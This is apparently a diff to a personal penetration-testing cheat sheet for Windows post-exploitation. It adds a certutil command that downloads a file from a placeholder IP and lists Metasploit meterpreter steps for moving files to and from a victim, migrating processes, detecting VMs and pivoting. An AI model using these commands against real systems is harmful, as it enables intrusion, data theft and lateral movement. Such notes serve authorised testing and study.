@@ -124,7 +124,7 @@ shell
 		| whoami /priv : Lists privilege information
 		| whoami /group : Lists which groups we belong to
 		
-	| net user : List users
+	| net users : List users
 		| net user <user> : Specific information on <user>
 	
 	| net localgroup : List groups we belong to
@@ -158,6 +158,8 @@ shell
 		| netsh firewall show state : Display the state of the firewall
 		| netsh firewall show config : Display firewall configuration
 		
+Transfer files:
+	| certutil -urlcache -f xxx.xxx.xxx.xxx:xxxx/file.something file.saveas
 	
 =======================
 ===ENUMERATION TOOLS===
@@ -174,3 +176,22 @@ PowerShell:
 	| PowerUp.ps1
 	| jaws-enum.ps1
 	
+Other:
+	| windows-exploit-suggester.py (local)
+	| Exploit Suggester (Metasploit)
+	
+Metasploit:
+	
+	| After getting a shell:
+		| getuid : Shows our current user 
+		| cd c:\\windows\\somedir\\
+		| upload /path/to/file.something | Uploads a file to the victim
+		| download /path/to/file.something | Downloads a file from the victim
+		| load powershell : Loads the powershell module
+			| powershell_shell : Loads Powershell shell
+		| shell : CMD shell
+		| run post/multi/recon/local_exploit_suggester : Automated exploit checking utility
+		| migrate <PID> : Increase stability, need privs
+		| run post/windows/gather/checkvm : Check if system is a VM
+		| run autoroute -h : Check if pivoting through the victim will work (has more than 1 NIC and has access to other networks)
+		
